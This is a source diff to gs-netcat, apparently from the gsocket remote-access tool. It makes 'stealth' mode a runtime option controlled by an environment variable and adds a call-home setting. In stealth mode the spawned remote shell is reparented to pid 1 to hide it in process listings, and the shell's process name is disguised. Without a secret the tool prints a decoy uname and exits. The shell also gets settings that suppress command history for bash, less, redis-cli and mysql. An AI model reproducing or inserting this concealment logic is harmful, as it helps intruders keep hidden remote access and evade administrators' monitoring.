@@ -74,13 +74,14 @@ add_env_argv(int *argcptr, char **argvptr[])
 }
 
 void
-init_defaults(int *argcptr, char **argvptr[])
+init_defaults(int argc, int *argcptr, char **argvptr[])
 {
 #ifdef DEBUG
 	gopt.is_built_debug = 1;
 #endif
 	gopt.log_fp = stderr;
 	gopt.err_fp = stderr;
+	gopt.argc = argc;
 	signal(SIGPIPE, SIG_IGN);
 	signal(SIGCHLD, SIG_IGN);	// no defunct childs please
 	gopt.prg_name = NULL;
@@ -122,8 +123,13 @@ init_defaults(int *argcptr, char **argvptr[])
 		ret = setregid(e, e);
 
 	add_env_argv(argcptr, argvptr);
+	if (argcptr != NULL)
+		gopt.argc = *argcptr;
 
 	gopt.app_keepalive_sec = GS_APP_KEEPALIVE;
+
+	if (GS_getenv("GS_STEALTH") != NULL)
+		gopt.flags |= GSC_FL_IS_STEALTH;
 }
 
 GS *
@@ -197,6 +203,18 @@ void
 init_vars(void)
 {
 	GS_library_init(gopt.err_fp, /* Debug Output */ gopt.err_fp, cb_gs_log);
+
+	if (gopt.flags & GSC_FL_OPT_IS_G) {
+		gopt.sec_str = GS_gen_secret();
+		if (gopt.argc <= 2) {
+			printf("%s\n", gopt.sec_str);
+			fflush(stdout);
+			exit(0);
+		}
+		if ((gopt.flags & GSC_FL_OPT_IS_SEC) && (!gopt.is_quiet))
+			fprintf(stderr, "WARNING: -s is ignored because -g is specified.\n");
+	}
+
 	GS_LIST_init(&gopt.ids_peers, 0);
 	GS_CTX_init(&gopt.gs_ctx, &gopt.rfd, &gopt.wfd, &gopt.r, &gopt.w, &gopt.tv_now);
 
@@ -225,7 +243,10 @@ init_vars(void)
 		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_LOW_LATENCY, NULL, 0);
 
 	if (gopt.gs_server_check_sec > 0)
-		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_SERVER_CHECK, NULL, 0);
+		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_BUDDY_CHECK, NULL, 0);
+
+	if (gopt.homecall_sec > 0)
+		GS_CTX_setsockopt(&gopt.gs_ctx, GS_OPT_CALLHOME_SEC, &gopt.homecall_sec, sizeof gopt.homecall_sec);
 
 	// Prevent startup messages if gs-netcat is started as sub-system from
 	// gs-sftp or gs-mount
@@ -241,22 +262,19 @@ init_vars(void)
 	if ((gopt.sec_file == NULL) && (gopt.sec_str == NULL))
 		is_sec_by_prompt = 1;
 
-#ifdef STEALTH
-	// No "=Secret   :" if GS_ARGS is set as we assume secret is passed
-	// by GS_ARGS (and thus known to user)
-	if (gs_args != NULL)
-		gopt.is_greetings = 0;
+	if (gopt.flags & GSC_FL_IS_STEALTH) {
+		// No "=Secret   :" if GS_ARGS is set as we assume secret is passed
+		// by GS_ARGS (and thus known to user)
+		if (gs_args != NULL)
+			gopt.is_greetings = 0;
 
-	// do not allow execution without supplied secret.
-	if (gs_args == NULL)
-	{
-		if (is_sec_by_prompt)
-		{
+		// do not allow execution without supplied secret.
+		if ((gs_args == NULL) && (is_sec_by_prompt)) {
 			system("uname -a");
 			exit(0);
 		}
 	}
-#endif
+
 	if (gs_args != NULL)
 		GS_LOG_V("=Extra arguments: '%s'\n", gs_args);
 
@@ -418,6 +436,7 @@ do_getopt(int argc, char *argv[])
 				gopt.flags |= GSC_FL_IS_SERVER;
 				break;
 			case 's':
+				gopt.flags |= GSC_FL_OPT_IS_SEC;
 				gopt.sec_str = strdup(optarg);
 				zap_arg(optarg);
 				break;
@@ -426,9 +445,8 @@ do_getopt(int argc, char *argv[])
 				zap_arg(optarg);
 				break;
 			case 'g':		/* Generate a secret */
-				printf("%s\n", GS_gen_secret());
-				fflush(stdout);
-				exit(0);
+				gopt.flags |= GSC_FL_OPT_IS_G;
+				break;
 #ifndef STEALTH
 			case '3':
 				if (strcmp(optarg, "1337") == 0)
@@ -719,15 +737,15 @@ mk_shellname(const char *shell, char *shell_name, ssize_t len, const char **prgn
 
 	ptr += 1;
 	*prgname = NULL;
-#ifdef STEALTH
-	struct stat st;
-	// Set PRGNAME unless it's a link (BusyBox etc)
-	if (lstat(shell, &st) == 0)
-	{
-		if (!S_ISLNK(st.st_mode))
-			*prgname = gopt.prg_name; // HIDE as prg_name
+
+	if (gopt.flags & GSC_FL_IS_STEALTH) {
+		struct stat st;
+		// Set PRGNAME unless it's a link (BusyBox etc)
+		if (lstat(shell, &st) == 0) {
+			if (!S_ISLNK(st.st_mode))
+				*prgname = gopt.prg_name; // HIDE as prg_name
+		}
 	}
-#endif
 	
 	snprintf(shell_name, len, "-%s", ptr);
 	if (*prgname == NULL)
@@ -976,12 +994,12 @@ pty_cmd(const char *cmd, pid_t *pidptr, int *err)
 	int is_nopty = 0;
 	char **envp;
 	size_t envplen = 0;
+
 	envp = calloc(64, sizeof *envp);
 	
 	*err = 0;
 	pid = forkpty(&fd, NULL, NULL, NULL);
-	if (pid < 0)
-	{
+	if (pid < 0) {
 		*err = GS_FD_CMD_ERR_NOPTY;
 		is_nopty = 1;
 		// In restricted environments /dev/ptmx is not available.
@@ -991,132 +1009,148 @@ pty_cmd(const char *cmd, pid_t *pidptr, int *err)
 	}
 	XASSERT(pid >= 0, "Error: forkpty()=%d: %s\n", pid, strerror(errno));
 
-	if (pid == 0)
-	{
-		/* Our own forkpty() (solaris 10) returns the actual slave TTY.
-		 * We can not open /dev/st on solaris10 and use the fd that
-		 * our own forkpty() returns. Any other OS needs to open
-		 * /dev/tty to get correct fd for child's tty.
-		 */
-		#ifdef HAVE_FORKPTY
-		if (*err != GS_FD_CMD_ERR_NOPTY)
-		{
-			int fd_x;
-			fd_x = open("/dev/tty", O_NOCTTY | O_RDWR);
-			if (fd_x >= 0)
-				fd = fd_x;
-		}
-		#endif
+	if (pid > 0) {
+		/* HERE: Parent */
+		if (pidptr)
+			*pidptr = pid;
 
-		/* HERE: Child */
-		setup_cmd_child(fd);
-
-		signal(SIGINT, SIG_DFL);
-		signal(SIGCHLD, SIG_DFL);
-		signal(SIGTERM, SIG_DFL);
-		/* Find out default ENV (just in case they do not exist in current
-		 * env-variable such as when started during bootup.
-		 * Note: Do not use shell from /etc/passwd as this might be /bin/nologin.
-		 * Instead, use the same shell that was used when gs-netcat server got
-		 * started.
-		 */
-		const char *shell = NULL; //"/bin/sh"; // default
-		char shell_name[64];	// e.g. -bash
-		const char *prg_name;
-		shell_name[0] = '\0';
-		if (cmd == NULL)
-			shell = GS_getenv("SHELL");
-		shell = mk_shellname(shell, shell_name, sizeof shell_name, &prg_name);
-		if (shell == NULL)
-			SLOWEXIT("No shell found in /bin or /usr/bin or ./. Try setting SHELL=\n");
-
-		char buf[1024];
-		snprintf(buf, sizeof buf, "SHELL=%s", shell);
-		envp[envplen++] = strdup(buf);
-
-		char *user = "root";
-		char *home_env = "HOME=/root";
-		// char *name_env;
-		// char *logname_env;
-		struct passwd *pwd;
-		pwd = getpwuid(getuid());
-		if (pwd != NULL)
-		{
-			user = strdup(pwd->pw_name);
-			snprintf(buf, sizeof buf, "HOME=%s", pwd->pw_dir);
-			home_env = strdup(buf);
-		}
-		envp[envplen++] = home_env;
-
-		// Sometimes the user has no home directory or there is no .bashrc.
-		// Do the best we can to set a nice prompt and give a hint to the user.
-		char *str = "\\[\\033[36m\\]\\u\\[\\033[m\\]@\\[\\033[32m\\]\\h:\\[\\033[33;1m\\]\\w\\[\\033[m\\]\\$ ";
-		snprintf(buf, sizeof buf, "PS1=%s", str);
-		printf("=Hint           : PS1='%s'\n", str);
-		if (GS_getenv("PS1") == NULL)
-		{
-			// Note: This only works for /bin/sh because bash resets this value.
-			envp[envplen++] = strdup(buf);
-			envp[envplen++] = "PS2=> ";
-		}
-
-		snprintf(buf, sizeof buf, "USER=%s", user);
-		envp[envplen++] = strdup(buf);
-		snprintf(buf, sizeof buf, "LOGNAME=%s", user);
-		envp[envplen++] = strdup(buf);
-
-		if (shell[0] == '.')
-		{
-			// Windows without cygwin install executes ./bash or ./sh
-			snprintf(buf, sizeof buf, "PATH=%s:%s", getcwdx()?:"/", GS_getenv("PATH")?:"/usr/bin:/bin:/usr/sbin:/sbin");
-		} else {
-			snprintf(buf, sizeof buf, "PATH=%s", GS_getenv("PATH")?:"/usr/bin:/bin:/usr/sbin:/sbin");
-		}
-		envp[envplen++] = strdup(buf);
-
-		snprintf(buf, sizeof buf, "MAIL=/var/mail/%.50s", user);
-		envp[envplen++] = strdup(buf);
-
-		/* Start with a clean environemnt (like OpenSSH does).
-		 * STY = Confuses screen if gs-netcat is started from within screen (OSX)
-		 * GSOCKET_ARGS = Otherwise any further gs-netcat command would
-		 *    execute with same (hidden) commands as the current shell.
-		 * HISTFILE= does not work on oh-my-zsh (it sets it again)
-		 * FIXME: See OpenSSH/session.c:
-		 * 1. Read /etc/default/login
-		 * 2. Retrieve TZ, TERM, DISPLAY, LANG, LC from client.
-		 * 3. Add ~/.ssh/environment
-		 */
-		envp[envplen++] = "TERM=xterm-256color";
-		envp[envplen++] = "HISTFILE=/dev/null";
-		envp[envplen++] = "LANG=en_US.UTF-8";
-
-		if (cmd != NULL)
-		{
-			execle("/bin/sh", cmd, "-c", cmd, NULL, envp);
-			SLOWEXIT("exec(%s) failed: %s\n", cmd, strerror(errno));
-		} 
-
-		if (is_nopty)
-		{
-			const char *args = "-il";	// bash, fish, zsh
-			if (strcmp(shell_name, "-sh") == 0)
-				args = "-i";	// solaris 10 /bin/sh does not like -l
-			if (strcmp(shell_name, "-csh") == 0)
-				execle(shell, prg_name, NULL, envp); // csh (fbsd) without any arguments
-			execle(shell, prg_name, args, NULL, envp); // No PTY. Need '-il'.
-		}
-
-		// For PTY Terminals the -il is not needed
-		execle(shell, prg_name, NULL, envp);
-		SLOWEXIT("execlp(%s) failed: %s\n", shell, strerror(errno));
+		return fd;
 	}
-	/* HERE: Parent */
 
-	if (pidptr)
-		*pidptr = pid;
+	/* Make pid==1 the shell's parent to obfuscate `ps -eF f` view */
+	if (gopt.flags & GSC_FL_IS_STEALTH) {
+		pid = fork();
+		XASSERT(pid >= 0, "fork(): %s\n", strerror(errno));
 
-	return fd;
+		if (pid > 0) {
+			gopt.flags |= GSC_FL_IS_NO_ATEXIT;
+			// Oops. odd. if we exit to quickly then the child gets an I/O error
+			// on the connected socketpair().
+			sleep(1);
+			exit(0);	// Parent exits
+		}
+
+		/* HERE: Child. */
+		setsid();
+	}
+
+	/* Our own forkpty() (solaris 10) returns the actual slave TTY.
+ 	 * We can not open /dev/st on solaris10 and use the fd that
+	 * our own forkpty() returns. Any other OS needs to open
+	 * /dev/tty to get correct fd for child's tty.
+	 */
+	#ifdef HAVE_FORKPTY
+	if (*err != GS_FD_CMD_ERR_NOPTY) {
+		int fd_x;
+		fd_x = open("/dev/tty", O_NOCTTY | O_RDWR);
+		if (fd_x >= 0)
+			fd = fd_x;
+	}
+	#endif
+
+	/* HERE: Child */
+	setup_cmd_child(fd);
+
+	signal(SIGINT, SIG_DFL);
+	signal(SIGCHLD, SIG_DFL);
+	signal(SIGTERM, SIG_DFL);
+	/* Find out default ENV (just in case they do not exist in current
+		* env-variable such as when started during bootup.
+		* Note: Do not use shell from /etc/passwd as this might be /bin/nologin.
+		* Instead, use the same shell that was used when gs-netcat server got
+		* started.
+		*/
+	const char *shell = NULL; //"/bin/sh"; // default
+	char shell_name[64];	// e.g. -bash
+	const char *prg_name;
+	shell_name[0] = '\0';
+	if (cmd == NULL)
+		shell = GS_getenv("SHELL");
+	shell = mk_shellname(shell, shell_name, sizeof shell_name, &prg_name);
+	if (shell == NULL)
+		SLOWEXIT("No shell found in /bin or /usr/bin or ./. Try setting SHELL=\n");
+
+	char buf[1024];
+	snprintf(buf, sizeof buf, "SHELL=%s", shell);
+	envp[envplen++] = strdup(buf);
+
+	char *user = "root";
+	char *home_env = "HOME=/root";
+	// char *name_env;
+	// char *logname_env;
+	struct passwd *pwd;
+	pwd = getpwuid(getuid());
+	if (pwd != NULL) {
+		user = strdup(pwd->pw_name);
+		snprintf(buf, sizeof buf, "HOME=%s", pwd->pw_dir);
+		home_env = strdup(buf);
+	}
+	envp[envplen++] = home_env;
+
+	// Sometimes the user has no home directory or there is no .bashrc.
+	// Do the best we can to set a nice prompt and give a hint to the user.
+	char *str = "\\[\\033[36m\\]\\u\\[\\033[m\\]@\\[\\033[32m\\]\\h:\\[\\033[33;1m\\]\\w\\[\\033[m\\]\\$ ";
+	snprintf(buf, sizeof buf, "PS1=%s", str);
+	printf("=Hint           : PS1='%s'\n", str);
+	if (GS_getenv("PS1") == NULL) {
+		// Note: This only works for /bin/sh because some bash reset this value.
+		envp[envplen++] = strdup(buf);
+		envp[envplen++] = "PS2=> ";
+	}
+
+	snprintf(buf, sizeof buf, "USER=%s", user);
+	envp[envplen++] = strdup(buf);
+	snprintf(buf, sizeof buf, "LOGNAME=%s", user);
+	envp[envplen++] = strdup(buf);
+
+	if (shell[0] == '.') {
+		// Windows without cygwin install executes ./bash or ./sh
+		snprintf(buf, sizeof buf, "PATH=%s:%s", getcwdx()?:"/", GS_getenv("PATH")?:"/usr/bin:/bin:/usr/sbin:/sbin");
+	} else {
+		snprintf(buf, sizeof buf, "PATH=%s", GS_getenv("PATH")?:"/usr/bin:/bin:/usr/sbin:/sbin");
+	}
+	envp[envplen++] = strdup(buf);
+
+	snprintf(buf, sizeof buf, "MAIL=/var/mail/%.50s", user);
+	envp[envplen++] = strdup(buf);
+
+	/* Start with a clean environemnt (like OpenSSH does).
+		* STY = Confuses screen if gs-netcat is started from within screen (OSX)
+		* GSOCKET_ARGS = Otherwise any further gs-netcat command would
+		*    execute with same (hidden) commands as the current shell.
+		* HISTFILE= does not work on oh-my-zsh (it sets it again)
+		* FIXME: See OpenSSH/session.c:
+		* 1. Read /etc/default/login
+		* 2. Retrieve TZ, TERM, DISPLAY, LANG, LC from client.
+		* 3. Add ~/.ssh/environment
+		*/
+	envp[envplen++] = "TERM=xterm-256color";
+	envp[envplen++] = "HISTFILE=/dev/null";
+	envp[envplen++] = "LESSHISTFILE=-";
+	envp[envplen++] = "REDISCLI_HISTFILE=/dev/null";
+	envp[envplen++] = "MYSQL_HISTFILE=/dev/null";
+	envp[envplen++] = "T=\t~$:?";
+	envp[envplen++] = "LANG=C.UTF-8";
+
+	if (cmd != NULL) {
+		execle("/bin/sh", cmd, "-c", cmd, NULL, envp);
+		SLOWEXIT("exec(%s) failed: %s\n", cmd, strerror(errno));
+	} 
+
+	if (is_nopty) {
+		const char *args = "-il";	// bash, fish, zsh
+		if (strcmp(shell_name, "-sh") == 0)
+			args = "-i";	// solaris 10 /bin/sh does not like -l
+		if (strcmp(shell_name, "-csh") == 0)
+			execle(shell, prg_name, NULL, envp); // csh (fbsd) without any arguments
+		execle(shell, prg_name, args, NULL, envp); // No PTY. Need '-il'.
+	}
+
+	// For PTY Terminals the -il is not needed
+	execle(shell, prg_name, NULL, envp);
+	SLOWEXIT("execlp(%s) failed: %s\n", shell, strerror(errno));
+
+	return -1; // NOT REACHED
 }
 
 /*
